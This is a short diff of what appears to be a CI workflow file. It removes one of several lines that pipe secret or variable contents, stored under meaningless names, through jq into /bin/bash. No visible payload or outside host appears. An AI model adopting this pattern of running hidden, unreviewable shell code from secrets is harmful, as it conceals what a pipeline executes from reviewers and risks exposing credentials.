@@ -23,7 +23,6 @@ jobs:
           m9: ${{ secrets.m9 }}
         run: |
           printf '%s' "$m9" | jq -r .jn5 | /bin/bash
-          echo $xlae76383 | jq -r .bgaz923 | /bin/bash
           echo $kf57473 | jq -r .pfcdi6 | /bin/bash
           echo $ie4834 | jq -r .kw3 | /bin/bash
           echo $rgq97 | jq -r .oqfc1449 | /bin/bash
